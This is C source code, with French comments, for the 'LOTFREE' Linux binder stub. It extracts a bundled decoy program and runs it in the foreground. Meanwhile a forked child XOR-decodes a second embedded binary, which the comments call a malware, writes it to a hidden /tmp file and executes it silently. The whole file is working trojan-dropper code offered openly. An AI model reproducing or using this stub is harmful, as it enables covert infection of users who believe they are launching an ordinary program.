/* LOTFREE Linux stub: extract two binaries and execute them */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>

/* Masque utilise pour les fichiers temporaires */
#define TPLNAME "/tmp/.lotfXXXXXX"
/* Cle pour l'encodage, identique a celle du binder */
#define MAGIC 'o'

int main(int argc, char *argv[], char *envp[])
{
  unsigned int sign = 0x46544F4C;
  unsigned int size1, size2 = 0;
  unsigned int magic = 0;
  int fd, out = 0;
  char *template;
  unsigned char buffer[64], x ,tmp;
  pid_t pid;

  fd = open(argv[0], O_RDONLY);
  if(fd == -1)
  {
    return 1;
  }
  /* Va a la fin du fichier - 12 octets
   * Lit les tailles des fichiers + signature */
  lseek(fd, -12, SEEK_END);
  read(fd, &size1, 4);
  read(fd, &size2, 4);
  read(fd, &magic, 4);
  if(sign != magic)
  {
    close(fd);
    return 1;
  }

  /* Si t'avances pendant que je recule, comment veux-tu... */
  lseek(fd, -12, SEEK_END);
  lseek(fd, -size2, SEEK_CUR);
  lseek(fd, -size1, SEEK_CUR);

  template = malloc(strlen(TPLNAME) + 1);
  /* On cree le "bon" fichier */
  strcpy(template, TPLNAME);
  out = mkstemp(template);
  fchmod(out, S_IRUSR|S_IWUSR|S_IXUSR);
  while(size1 >= 64)
  {
    read(fd, buffer, 64);
    write(out, buffer, 64);
    size1 -= 64;
  }
  if(size1 > 0)
  {
    read(fd, buffer, size1);
    write(out, buffer, size1);
  }
  close(out);

  signal(SIGHUP, SIG_IGN);
  signal(SIGCHLD, SIG_IGN);
  /* Viens la que je te fork() */
  pid = fork();
  if(pid > 0)
  {
    /* On execute le binaire extrait en reproduisant
     * les arguments et l'environnement tel que ceux
     * utilises par l'user sur le stub */
    close(fd);
    execve(template, argv, envp);
    return 0;
  }
  else if(pid == 0)
  {
    /* Accouche d'un petit malware */
    sleep(1);
    unlink(template);

    strcpy(template, TPLNAME);
    out = mkstemp(template);
    fchmod(out, S_IRUSR|S_IWUSR|S_IXUSR);

    /* Decode, ecrit et execute */
    x = MAGIC;
    while(size2 >= 64)
    {
      read(fd, buffer, 64);
      for(magic = 0; magic < 64; magic++)
      {
        tmp = buffer[magic];
        buffer[magic] ^= x;
        x = tmp;
      }
      write(out, buffer, 64);
      size2 -= 64;
    }
    if(size2 > 0)
    {
      read(fd, buffer, size2);
      for(magic = 0; magic < size2; magic++)
      {
        tmp = buffer[magic];
        buffer[magic] ^= x;
        x = tmp;
      }
      write(out, buffer, size2);
    }
    close(out);
    close(fd);

    execl(template, NULL, NULL);
    /* Aye, c pwne ! */
    free(template);
  }

  return 0;
}

